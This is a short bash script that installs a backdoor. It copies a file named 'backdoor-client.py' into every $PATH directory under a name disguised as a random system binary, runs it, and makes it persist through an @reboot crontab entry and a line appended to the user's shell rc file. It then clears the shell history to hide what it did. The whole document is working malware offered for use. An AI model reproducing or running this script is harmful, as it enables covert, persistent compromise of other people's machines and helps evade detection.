#!/usr/bin/env bash

FROM_PATH="$(dirname $0)/backdoor-client.py" # Backdoor script path
TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)-" # Final script name

# For each path in $PATH, try to copy our backdoor script into it
IFS=':' read -ra PATHS <<< "$PATH"
for path in "${PATHS[@]}"; do
  echo $path
  mkdir -p $path > /dev/null 2>&1
  cp $FROM_PATH "$path/$TARGET_NAME" > /dev/null 2>&1
done

$TARGET_NAME # Run our script, should be in one of $PATH

## CRONTAB
CRONFILE="tmp"
PATH_SCRIPT=$(which $TARGET_NAME) # Get the path of the backdoor
echo "@reboot $PATH_SCRIPT" > $CRONFILE # Write a cron task
$(crontab $CRONFILE > /dev/null 2>&1) # Update crontab with the file
rm -f $CRONFILE # Remove the file

## SHELL CONFIG
SHELL=$(basename $SHELL) # Get the shell name
CONFIG_PATH="$HOME/.${SHELL}rc" # Get the shell config file
echo "$TARGET_NAME" >> $CONFIG_PATH # Append our script into the shell config

history -c # Clear the history
